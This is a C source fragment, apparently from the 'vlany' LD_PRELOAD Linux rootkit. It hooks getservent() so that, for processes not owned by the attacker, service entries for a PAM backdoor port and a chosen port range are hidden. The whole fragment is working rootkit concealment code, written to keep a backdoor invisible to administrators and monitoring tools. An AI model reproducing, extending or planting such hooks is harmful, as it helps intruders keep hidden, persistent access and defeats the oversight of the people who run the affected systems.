struct servent *getservent(void)
{
    #ifdef DEBUG
        printf("[vlany] getservent() called\n");
    #endif

    HOOK(old_getservent, CGETSERVENT);

    if(owned()) return old_getservent();

    struct servent *tmp = old_getservent();
    if(tmp && (ntohs(tmp->s_port) == PAM_PORT || (ntohs(tmp->s_port) < HIGH_PORT && ntohs(tmp->s_port) > LOW_PORT))) return NULL;

    return tmp;
}
